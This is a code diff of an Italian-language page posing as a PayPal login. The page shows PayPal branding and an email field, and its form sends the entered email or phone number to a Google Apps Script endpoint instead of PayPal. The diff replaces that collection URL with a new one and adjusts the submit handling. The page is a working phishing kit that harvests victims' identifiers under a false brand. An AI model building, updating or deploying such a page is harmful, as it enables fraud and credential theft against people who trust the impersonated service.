@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login PayPal</title>
   <style>
-    /* tutto il tuo CSS rimane uguale */
     * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
     html, body { height:100%; background-color:#f5f5f5; }
     .container { display:flex; align-items:center; justify-content:center; height:100%; padding:20px; }
@@ -34,8 +33,12 @@
       <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg"
            alt="PayPal" class="logo">
 
-      <form id="emailForm" action="https://script.google.com/macros/s/AKfycbxee2MFy6Q1gq862TIWzYMj0uYJCOAcTkVipXEApAqXKNSZMvCFIIXNw7TkHFBvZcvo/exec" method="POST" onsubmit="return handleSubmit(event)">
-        <input type="email" name="email" id="email" placeholder="Email o numero di cellulare" required>
+      <form id="emailForm"
+            action="https://script.google.com/macros/s/AKfycbwDhFUL_kvf8VAWHgv9Qnloo2kQ5IWcKTo4sk7INzZhDS7X6aKzSZZu_8O64aC2aTzV/exec"
+            method="POST"
+            onsubmit="return handleSubmit(event)">
+        <input type="email" name="email" id="email"
+               placeholder="Email o numero di cellulare" required>
         <a href="#" class="forgot">Hai dimenticato l'indirizzo email?</a>
         <button class="btn-primary" type="submit">Avanti</button>
       </form>
@@ -58,7 +61,6 @@
   <script>
     function handleSubmit(e) {
       e.preventDefault();
-
       const form = document.getElementById("emailForm");
       const email = document.getElementById("email").value.trim();
       const status = document.getElementById("status");
@@ -74,14 +76,13 @@
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: new URLSearchParams(new FormData(form))
       })
-      .then(response => response.text())
-      .then(text => {
-        if (text === "OK") {
+      .then(response => {
+        if (response.ok) {
           status.textContent = "Email inviata con successo!";
           status.style.color = "green";
           form.reset();
         } else {
-          throw new Error(text);
+          throw new Error("HTTP " + response.status);
         }
       })
       .catch(err => {
